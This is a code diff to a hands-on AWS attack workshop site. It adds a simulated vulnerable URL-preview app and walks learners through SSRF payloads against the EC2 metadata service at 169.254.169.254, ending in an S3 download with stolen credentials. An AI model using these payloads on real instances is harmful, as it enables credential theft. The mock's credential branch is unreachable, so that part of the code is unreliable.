@@ -213,6 +213,26 @@ h4{font-size:16px;font-weight:700;margin-bottom:8px}
 @keyframes toastO{0%{opacity:1}100%{opacity:0;transform:translateY(-8px)}}
 @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
 .shake{animation:shake .3s ease}
+.mock-browser{border:1px solid var(--br);border-radius:var(--rad);overflow:hidden;background:var(--bg2)}
+.mock-browser-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,255,255,.03);border-bottom:1px solid var(--br)}
+.mock-browser-bar .dots{display:flex;gap:6px}
+.mock-browser-bar .dots span{width:10px;height:10px;border-radius:50%}
+.mock-browser-bar .url-bar{flex:1;padding:6px 12px;background:var(--bg3);border:1px solid var(--br);border-radius:20px;font-size:12px;font-family:var(--mono);color:var(--tm)}
+.mock-browser-body{padding:0;background:#1a1f2e;min-height:340px}
+.mock-webapp{padding:40px;text-align:center}
+.mock-webapp h2{font-size:24px;font-weight:700;color:var(--t1);margin-bottom:8px}
+.mock-webapp p{font-size:14px;color:var(--tm);margin-bottom:24px}
+.mock-webapp .mock-input-row{display:flex;gap:10px;max-width:520px;margin:0 auto 16px}
+.mock-webapp .mock-input{flex:1;padding:12px 16px;background:var(--bg3);border:1px solid var(--br2);border-radius:var(--rads);font-size:14px;font-family:var(--mono);color:var(--t1);outline:none}
+.mock-webapp .mock-input:focus{border-color:var(--b)}
+.mock-webapp .mock-input::placeholder{color:var(--td)}
+.mock-webapp .mock-btn{padding:12px 24px;background:var(--b);color:#fff;border:none;border-radius:var(--rads);font-size:14px;font-weight:700;cursor:pointer}
+.mock-webapp .mock-btn:hover{opacity:.9}
+.mock-result{margin-top:16px;padding:16px;background:var(--bgt);border:1px solid var(--br);border-radius:var(--rads);text-align:left;font-family:var(--mono);font-size:13px;color:var(--tm);max-width:520px;margin-left:auto;margin-right:auto;min-height:60px;display:none}
+.mock-result.vis{display:block;animation:fadeS .3s ease}
+.mock-nav{display:flex;gap:24px;justify-content:center;margin-bottom:32px;font-size:13px;color:var(--tm)}
+.mock-nav span{padding:6px 0;border-bottom:2px solid transparent;cursor:default}
+.mock-nav span.active{color:var(--b);border-bottom-color:var(--b)}
 .pillar{padding:12px 18px;border-radius:var(--rads);font-size:14px;font-weight:600;border:1px solid var(--br);background:var(--bg2);margin-bottom:8px}
 .pillar .pnum{display:inline-block;width:24px;height:24px;border-radius:50%;background:var(--bg3);text-align:center;line-height:24px;font-size:12px;font-weight:800;margin-right:10px;color:var(--g)}
 .quote{font-size:20px;font-style:italic;color:var(--t1);line-height:1.5;padding:24px;border-left:4px solid var(--g);background:rgba(0,232,123,.02);border-radius:0 var(--rad) var(--rad) 0;margin:20px 0}
@@ -240,14 +260,14 @@ const NAV=[
 {id:'5',label:'Student Environment',n:'5',ch:[{id:'5.1',label:'Script Setup'},{id:'5.2',label:'Console Setup'},{id:'5.3',label:'Timezone Errors'}]},
 {id:'6',label:'Attack Surface',n:'6'},
 {id:'7',label:'AWS IAM',n:'7',ch:[{id:'7.0',label:'IAM Deep Dive'},{id:'7.0b',label:'Policy Evaluation'},{id:'7.1',label:'6 Misconfig Categories'},{id:'7.1a',label:'Attack 1 — Scenario'},{id:'7.1b',label:'Attack 1 — Exploit'},{id:'7.2',label:'Attack 2 — Scenario'},{id:'7.3',label:'Attack 2 — Exploit'},{id:'7.4a',label:'Attack 3 — Cognito'},{id:'7.4',label:'Attack 3 — Exploit'}]},
-{id:'8',label:'Cloud Compute',n:'8',ch:[{id:'8.0',label:'EC2 & IMDS'},{id:'8.1',label:'SSRF Exploitation'}]},
+{id:'8',label:'Cloud Compute',n:'8',ch:[{id:'8.0',label:'EC2 & IMDS'},{id:'8.0w',label:'The Web App'},{id:'8.1',label:'SSRF Exploitation'}]},
 {id:'9',label:'Serverless',n:'9',ch:[{id:'9.0',label:'Lambda Architecture'},{id:'9.1',label:'Lambda Exploit'}]},
 {id:'10',label:'Cloud-Nuke',n:'10',ch:[{id:'10.0',label:'Nuke Execution'}]},
 {id:'11',label:'Kill Chain',n:'11'}
 ];
 const FLAT=[];NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>FLAT.push(c.id));else FLAT.push(s.id)});
 const PAR={};NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>PAR[c.id]=s.id)});
-const ACC={'1':{d:'none',l:'No Access',b:''},'2':{d:'none',l:'No Access',b:''},'3':{d:'none',l:'No Access',b:''},'4.1':{d:'none',l:'Setting Up',b:''},'4.2':{d:'auth',l:'Authenticated',b:'IAM user created'},'4.3':{d:'auth',l:'Authenticated',b:'CLI configured'},'5.1':{d:'auth',l:'Authenticated',b:''},'5.2':{d:'auth',l:'Authenticated',b:''},'5.3':{d:'auth',l:'Authenticated',b:''},'6':{d:'limited',l:'Read-Only IAM',b:'iam:Get*, iam:List*'},'7.0':{d:'limited',l:'Read-Only IAM',b:'Understanding IAM'},'7.0b':{d:'limited',l:'Read-Only IAM',b:'Policy evaluation'},'7.1':{d:'limited',l:'Read-Only IAM',b:'Reviewing misconfiguration patterns'},'7.1a':{d:'limited',l:'dev-user',b:'iam:AttachUserPolicy on *'},'7.1b':{d:'admin',l:'FULL ADMIN',b:'AttachUserPolicy → AdministratorAccess'},'7.2':{d:'limited',l:'Limited IAM',b:'iam:SetDefaultPolicyVersion'},'7.3':{d:'admin',l:'FULL ADMIN',b:'Rolled back to v1: Action *'},'7.4a':{d:'admin',l:'Admin',b:'Cognito Identity Pool'},'7.4':{d:'admin',l:'Admin + Cognito',b:'Unauth creds obtained'},'8.0':{d:'admin',l:'Admin + Creds',b:'Multiple paths'},'8.1':{d:'admin',l:'Admin + EC2 + S3',b:'Stolen EC2 role creds'},'9.0':{d:'admin',l:'Admin + EC2 + S3',b:''},'9.1':{d:'admin',l:'TOTAL TAKEOVER',b:'AdministratorAccess attached'},'10.0':{d:'clean',l:'Cleaning Up',b:''},'11':{d:'clean',l:'Neutralized',b:'All destroyed'}};
+const ACC={'1':{d:'none',l:'No Access',b:''},'2':{d:'none',l:'No Access',b:''},'3':{d:'none',l:'No Access',b:''},'4.1':{d:'none',l:'Setting Up',b:''},'4.2':{d:'auth',l:'Authenticated',b:'IAM user created'},'4.3':{d:'auth',l:'Authenticated',b:'CLI configured'},'5.1':{d:'auth',l:'Authenticated',b:''},'5.2':{d:'auth',l:'Authenticated',b:''},'5.3':{d:'auth',l:'Authenticated',b:''},'6':{d:'limited',l:'Read-Only IAM',b:'iam:Get*, iam:List*'},'7.0':{d:'limited',l:'Read-Only IAM',b:'Understanding IAM'},'7.0b':{d:'limited',l:'Read-Only IAM',b:'Policy evaluation'},'7.1':{d:'limited',l:'Read-Only IAM',b:'Reviewing misconfiguration patterns'},'7.1a':{d:'limited',l:'dev-user',b:'iam:AttachUserPolicy on *'},'7.1b':{d:'admin',l:'FULL ADMIN',b:'AttachUserPolicy → AdministratorAccess'},'7.2':{d:'limited',l:'Limited IAM',b:'iam:SetDefaultPolicyVersion'},'7.3':{d:'admin',l:'FULL ADMIN',b:'Rolled back to v1: Action *'},'7.4a':{d:'admin',l:'Admin',b:'Cognito Identity Pool'},'7.4':{d:'admin',l:'Admin + Cognito',b:'Unauth creds obtained'},'8.0':{d:'admin',l:'Admin + Creds',b:'Multiple paths'},'8.0w':{d:'admin',l:'Admin + Creds',b:'Exploring web app'},'8.1':{d:'admin',l:'Admin + EC2 + S3',b:'Stolen EC2 role creds'},'9.0':{d:'admin',l:'Admin + EC2 + S3',b:''},'9.1':{d:'admin',l:'TOTAL TAKEOVER',b:'AdministratorAccess attached'},'10.0':{d:'clean',l:'Cleaning Up',b:''},'11':{d:'clean',l:'Neutralized',b:'All destroyed'}};
 
 // ═══ Policy version data for wrong-choice branching ═══
 const VPOLICIES={
@@ -291,7 +311,7 @@ function cntUp(scope){$$(scope+' .mv[data-count]').forEach(el=>{const tgt=+el.da
 function buildScreens(){$('main').innerHTML=genAllScreens()}
 
 function genAllScreens(){return `
-${s1()}${s2()}${s3()}${s41()}${s42()}${s43()}${s51()}${s52()}${s53()}${s6()}${s70()}${s70b()}${s71()}${s71a()}${s71b()}${s72()}${s73()}${s74a()}${s74()}${s80()}${s81()}${s90()}${s91()}${s100()}${s11s()}
+${s1()}${s2()}${s3()}${s41()}${s42()}${s43()}${s51()}${s52()}${s53()}${s6()}${s70()}${s70b()}${s71()}${s71a()}${s71b()}${s72()}${s73()}${s74a()}${s74()}${s80()}${s80w()}${s81()}${s90()}${s91()}${s100()}${s11s()}
 `}
 
 function s1(){return `<div class="scr" data-id="1"><div class="tc" style="margin-top:24px"><div class="badge" style="justify-content:center">Hack The Bay 3.0</div><h1 class="ptitle" style="font-size:52px">AWS Cloud Attack Workshop</h1><p class="psub" style="margin:10px auto 44px;max-width:640px;text-align:center">An attack-focused, hands-on workshop. Learn common attack techniques against AWS cloud infrastructure — step by step.</p></div><div class="cg cg4" style="max-width:880px;margin:0 auto 44px"><div class="mc"><div class="mv" data-count="7">0</div><div class="ml">Attack Vectors</div></div><div class="mc"><div class="mv" data-count="5">0</div><div class="ml">AWS Services</div></div><div class="mc"><div class="mv" data-count="1">0</div><div class="ml">Kill Chain</div></div><div class="mc"><div class="mv" data-count="45">0</div><div class="ml">Minutes</div></div></div><div class="arch" style="max-width:880px;margin:0 auto 44px;gap:8px"><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">Identity</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-cog">${CSVG}</div><div class="an-l">Federation</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-ec2">${ESVG}</div><div class="an-l">Compute</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-s3">${SSVG}</div><div class="an-l">Data</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-lam">${LSVG}</div><div class="an-l">Serverless</div></div></div><div class="callout insight" style="max-width:880px;margin:0 auto 30px"><strong>Unifying Pattern:</strong> Every cloud attack follows the same steps — find an identity, understand trust relationships, traverse edges in the identity graph, escalate, repeat.</div><div class="tc"><button class="btn btn1 pulse" onclick="nav('2')">Begin Workshop →</button></div></div>`}
@@ -388,7 +408,30 @@ function s80(){return `<div class="scr" data-id="8.0"><div class="badge">Cloud C
 
 <div class="cpan"><div class="cp knows"><div class="cp-label">Attacker Has</div><ul><li>EC2 public IP: <code>54.234.112.87</code></li><li>Discovered <code>?url=</code> parameter via enumeration</li><li>Knowledge that IMDS lives at <code>169.254.169.254</code></li></ul></div><div class="cp wants"><div class="cp-label">Attack Chain</div><ul><li>Confirm SSRF works → query IMDS</li><li>Discover the IAM role name</li><li>Extract temporary role credentials</li><li>Use stolen creds to access S3 secrets</li></ul></div></div>
 
-<div class="mt-24"><button class="btn btn1" onclick="nav('8.1')">Begin SSRF Attack →</button></div></div>`}
+<div class="mt-24"><button class="btn btn1" onclick="nav('8.0w')">See the Web App →</button></div></div>`}
+
+function s80w(){return `<div class="scr" data-id="8.0w"><div class="badge">Cloud Compute</div><h1 class="ptitle">The Vulnerable Web Application</h1><p class="psub">The attacker finds a web app running on EC2 at <code>54.234.112.87</code>. It has a URL preview feature — enter a URL, the server fetches it for you.</p>
+
+<div class="mock-browser mb-24">
+<div class="mock-browser-bar"><div class="dots"><span style="background:#ff5f57"></span><span style="background:#febc2e"></span><span style="background:#28c840"></span></div><div class="url-bar">http://54.234.112.87</div></div>
+<div class="mock-browser-body"><div class="mock-webapp">
+<h2>URL Preview Tool</h2>
+<p>Enter a URL to fetch and preview its contents</p>
+<div class="mock-nav"><span class="active">Fetch URL</span><span>History</span><span>Settings</span></div>
+<div class="mock-input-row">
+<input class="mock-input" id="mock-url" placeholder="https://example.com" autocomplete="off">
+<button class="mock-btn" onclick="mockFetch()">Fetch →</button>
+</div>
+<div class="mock-result" id="mock-result"></div>
+</div></div>
+</div>
+
+<div class="callout danger"><strong>The Vulnerability:</strong> This app takes a URL from the user and makes a <strong>server-side HTTP request</strong> to it. The server is inside the EC2 instance — meaning it can reach internal resources the attacker cannot, including the metadata service at <code>169.254.169.254</code>.</div>
+
+<div class="card"><h4>Try It</h4><p style="font-size:13px;color:var(--t2);margin-top:6px">Enter a URL above to see how the app behaves. Try <code>https://example.com</code> first, then try <code>http://169.254.169.254/latest/meta-data/</code> — the metadata service that only the EC2 instance can reach.</p></div>
+
+<div class="mt-24"><button class="btn btn1" onclick="nav('8.1')">Proceed to SSRF Chain →</button></div>
+</div>`}
 
 function s81(){return `<div class="scr" data-id="8.1"><div class="badge">SSRF Exploitation</div><h1 class="ptitle">SSRF → Credential Theft</h1><p class="psub">Craft payloads, observe responses, chain the attack.</p><div class="cc mb-20" id="sc"><div class="cn" data-i="0"><div class="cib" style="border-color:var(--a);color:var(--a);background:rgba(240,160,48,.06)">URL</div><div class="cl">SSRF</div></div><div class="ca">→</div><div class="cn" data-i="1"><div class="cib" style="border-color:var(--cy);color:var(--cy);background:rgba(34,211,238,.06)">169</div><div class="cl">Metadata</div></div><div class="ca">→</div><div class="cn" data-i="2"><div class="cib" style="border-color:var(--r);color:var(--r);background:rgba(255,71,87,.06)">KEY</div><div class="cl">Creds</div></div><div class="ca">→</div><div class="cn" data-i="3"><div class="cib" style="border-color:var(--g);color:var(--g);background:rgba(0,232,123,.06)">S3</div><div class="cl">Secrets</div></div><div class="ca">→</div><div class="cn" data-i="4"><div class="cib" style="border-color:var(--r);color:#fff;background:var(--r)">ADM</div><div class="cl">Admin</div></div></div><div class="card mb-16" id="sb"><div style="display:flex;align-items:center;gap:10px"><label class="flbl" style="margin:0;white-space:nowrap">URL</label><input class="fi" id="su" style="flex:1" placeholder="Enter SSRF URL..." autocomplete="off"><button class="btn btn1 btns" onclick="doSSRF()">Send →</button></div><div style="font-size:11px;color:var(--td);margin-top:6px">Step <span id="ssn">1</span>/4 — <span id="ssd">Query metadata root</span></div><div class="epan" id="se"><h4>Invalid or Ineffective URL</h4><p id="sem"></p><div class="fix" id="sef"></div></div></div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">ssrf</span></div><div class="tb2" id="t81" style="max-height:320px"></div></div><div class="mt-24"><button class="btn btn1" id="b90" onclick="nav('9.0')" disabled>Lambda Architecture →</button></div></div>`}
 
@@ -561,6 +604,35 @@ aL(t,'Admin-level AWS credentials obtained','alrt');
 $('ccr').classList.add('vis');$('b80').disabled=false;toast('Admin credentials via attribute injection','error')}
 
 const SSRFS=[{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/',d:'Query metadata root'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',d:'Discover IAM role'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cloud_breach_s3_cgid',d:'Extract credentials'},{u:'aws s3 cp s3://cg-secret-s3-bucket-cgid/admin-credentials.txt ./ --profile stolen',d:'Download from S3'}];
+// ═══ MOCK WEB APP ═══
+function mockFetch(){
+  const url=$('mock-url').value.trim();
+  const res=$('mock-result');
+  if(!url){res.innerHTML='<span style="color:var(--r)">Please enter a URL</span>';res.classList.add('vis');return}
+  res.classList.add('vis');
+  if(url.includes('example.com')){
+    res.innerHTML='<span style="color:var(--tm)">&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;Example Domain&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Example Domain&lt;/h1&gt;\n&lt;p&gt;This domain is for use in illustrative examples...&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;</span>';
+    toast('Normal response — the app fetches external URLs','info');
+  } else if(url.includes('169.254.169.254')){
+    if(url.includes('security-credentials/')){
+      res.innerHTML='<span style="color:var(--r)">cg-ec2-role-cloud_breach_s3_cgid</span>';
+      toast('IAM role name exposed via SSRF!','error');
+    } else if(url.includes('security-credentials/cg-ec2')){
+      res.innerHTML='<span style="color:var(--r)">{\n  "Code": "Success",\n  "AccessKeyId": "ASIAZ3EXAMPLESSRF01",\n  "SecretAccessKey": "wJalr+SSRFstolen...",\n  "Token": "IQoJb3JpZ2lu...",\n  "Expiration": "2024-03-15T22:00:00Z"\n}</span>';
+      toast('IAM role CREDENTIALS stolen!','error');
+    } else {
+      res.innerHTML='<span style="color:var(--a)">ami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups</span>';
+      toast('Metadata service accessible — SSRF confirmed!','warning');
+    }
+  } else if(url.includes('google.com')||url.includes('http')){
+    res.innerHTML='<span style="color:var(--tm)">&lt;html&gt;&lt;head&gt;&lt;title&gt;External Site&lt;/title&gt;&lt;/head&gt;...truncated HTML response...</span>';
+    toast('External URL fetched — SSRF works, but look for internal targets','info');
+  } else {
+    res.innerHTML='<span style="color:var(--r)">Error: Could not resolve host</span>';
+    toast('Invalid URL','warning');
+  }
+}
+
 function initSSRF(){$('t81').innerHTML='';S.ssrfStep=0;$$('#sc .cn').forEach(n=>n.classList.remove('vis'));$$('#sc .ca').forEach(a=>a.classList.remove('vis'));$('b90').disabled=false;$('su').value=SSRFS[0].u;updSSRF();$('sb').style.opacity='1';$('sb').style.pointerEvents='auto'}
 function updSSRF(){const s=SSRFS[S.ssrfStep];if(s){$('ssn').textContent=S.ssrfStep+1;$('ssd').textContent=s.d}}
 async function doSSRF(){
